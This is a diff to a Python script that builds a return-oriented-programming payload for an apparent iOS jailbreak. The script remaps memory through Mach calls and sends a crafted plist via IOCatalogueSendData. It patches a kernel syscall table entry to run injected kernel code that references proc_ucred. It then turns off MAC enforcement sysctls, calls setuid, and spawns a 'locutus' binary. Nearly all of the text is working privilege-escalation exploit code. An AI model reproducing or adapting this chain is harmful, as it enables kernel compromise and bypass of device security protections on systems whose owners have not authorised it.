@@ -15,10 +15,12 @@ def read(f, size):
     if len(result) != size: raise Exception('truncated')
     return result
 
-def omgresult():
-    result, resultp = stackunkpair()
-    store_r0_to(resultp)
-    funcall('_printf', ptr('Result was %08x\n', True), result)
+def dbg_result():
+    # ensure that all of these are 0!
+    if False:
+        result, resultp = stackunkpair()
+        store_r0_to(resultp)
+        funcall('_printf', ptr('Result for line %d was %%08x\n' % sys._getframe().f_back.f_lineno, True), result)
 
 dmini.init(shlex.split(sys.argv[2]))
 
@@ -27,6 +29,7 @@ mcrdude = dmini.cur.find_basic('- 10 0f 03 ee 1e ff 2f e1') + 0
 # sub sp, r7, #20; pop {r8, r10}; pop {r4-r7, pc}
 popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')
 
+proc_ucred = dmini.cur.sym('_proc_ucred')
 
 dmini.init(shlex.split(sys.argv[1]))
 
@@ -47,14 +50,19 @@ locutus_len = os.path.getsize('../../locutus/locutus')
 
 # r0 came from stub.py
 out_sp, out_spp = stackunkpair()
-locutus, locutusp = stackunkpair()
 store_r0_to(out_spp)
-add_r0_by(0x558 - 0x624) # subrs, minus the offset we already added :psyduck:
+#funcall('_abort', None)
 load_r0_r0()
+load_r0_r0()
+load_r0_r0()
+locutus, locutusp = stackunkpair()
 store_r0_to(locutusp)
 
-# before we remap, save 0x1000 so we can have it back
+#funcall('_printf', ptr('starting shellcode\n', True))
 
+#funcall('_exit', 0)
+
+# before we remap, save 0x1000 so we can have it back
 # we want to remap 
 # find_kernel_ldm -> 0
 # stub & ~0xfff -> 0x1000
@@ -68,28 +76,34 @@ for i in xrange(9):
 
 sizep = ptrI(0x1000)
 memory_entry, memory_entryp = stackunkpair()
-funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0)
+funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
 protp = ptrI(0)
 zerop = ptrI(0)
 thousandp = ptrI(0x1000)
-funcall('_vm_deallocate', mtss.pop(), 0, 0x2000)
-funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm, 0, protp, protp, 2) 
-funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2)
-funcall('_mlock', 0, 0x2000)
-funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX
+funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
+funcall('_vm_remap', mtss.pop(), zerop, 0x1000, 1, 0, mtss.pop(), ldm, 0, protp, protp, 2); dbg_result()
+funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0xfff, 0, protp, protp, 2); dbg_result()
+funcall('_mlock', 0, 0x2000); dbg_result()
+#funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX
 
-plist = 'x'
+plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 
 #funcall('_abort')
 dmini.cur.choose_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
 funcall('_IOCatalogueSendData', 0, 1, ptr(plist), len(plist))
-
 dmini.cur.choose_file('/usr/lib/libSystem.B.dylib')
+dbg_result()
+
 #funcall('_strcpy', 0x801f2c84, ptr('You just lost the game.', True))
 #funcall('_printf', ptr('If this works, you won: %s\n', True), 0x801f2c84)
 #funcall('_exit', 0)
 
+
+# copy the real code we want to run in the kernel
+weirdfile = open('kcode.bin').read()[:-4] + struct.pack('I', proc_ucred)
+
+# (and parse the patchfile)
 while True:
     namelen = patchfile.read(4)
     if len(namelen) == 0: break
@@ -97,33 +111,31 @@ while True:
     name = read(patchfile, struct.unpack('I', namelen)[0])
     addr, = struct.unpack('I', read(patchfile, 4))
     data = read(patchfile, struct.unpack('I', read(patchfile, 4))[0])
-    #print repr(name), hex(addr), data.encode('hex')
     if name == 'sysent patch':
         sysent_patch, = struct.unpack('I', data)
     elif name == 'sysent patch orig':
         sysent_patch_orig, = struct.unpack('I', data)
     elif name == 'scratch':
         scratch, = struct.unpack('I', data)
-    if addr == 0 or name.startswith('+'): # in place only
+    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
         continue
-    if len(data) == 4:
-        store_val_to(struct.unpack('I', data)[0], addr)
-    else:
-        funcall('_memcpy', addr, ptr(data), len(data))
+    weirdfile += struct.pack('II', addr, len(data)) + data
 
-# cleanup with a syscall
-# mov r0, 1; mcr p15, 0, r0, c3, c0, 0; ldr r0, a; ldr r1, b; str r0, [r1]; mov r0, #0; bx lr
-cleaner = [0xe3a00001, 0xee030f10, 0xe59f000c, 0xe59f100c, 0xe5810000, 0xe3a00000, 0xe12fff1e, sysent_patch_orig, sysent_patch]
-funcall('_memcpy', scratch, ptrI(*cleaner), 4 * len(cleaner))
+weirdfile += struct.pack('III', sysent_patch, 4, sysent_patch_orig,)
+weirdfile += '\0\0\0\0'
+
+print len(weirdfile), hex(scratch)
+
+funcall('_memcpy', scratch, ptr(weirdfile), len(weirdfile))
 store_val_to(scratch, sysent_patch)
-funcall('_syscall', 0)
+funcall('_syscall', 0); dbg_result()
 
 # we're back in sanity land, do some housekeeping
-funcall('_munlock', 0, 0x2000)
-funcall('_vm_deallocate', mtss.pop(), 0, 0x2000)
-funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0)
-funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0)
-funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2)
+funcall('_munlock', 0, 0x2000); dbg_result()
+funcall('_vm_deallocate', mtss.pop(), 0, 0x2000); dbg_result()
+funcall('_vm_allocate', mtss.pop(), zerop, 0x1000, 0); dbg_result()
+funcall('_vm_protect', mtss.pop(), 0, 0x1000, 0, 0); dbg_result()
+funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2); dbg_result()
 
 O_WRONLY = 0x0001
 O_CREAT  = 0x0200
@@ -135,7 +147,15 @@ fd, fdp = stackunkpair()
 store_r0_to(fdp)
 funcall('_write', None, locutus, locutus_len)
 funcall('_close', fd)
-funcall('_execl', locutus_str, locutus_str, 0)
+funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
+
+funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
+funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
+
+funcall('_geteuid')
+funcall('_setuid', None); dbg_result()
+
+#funcall('_printf', ptr('done with shellcode\n', True))
 
 fancy_set_sp_to(out_sp)
 
@@ -143,5 +163,5 @@ final = finalize(0x11000000)
 
 #final = zlib.compress(final)
 #heapdump(None)
-open('output.txt', 'w').write(final)
+open('catalog.txt', 'w').write(final)
 
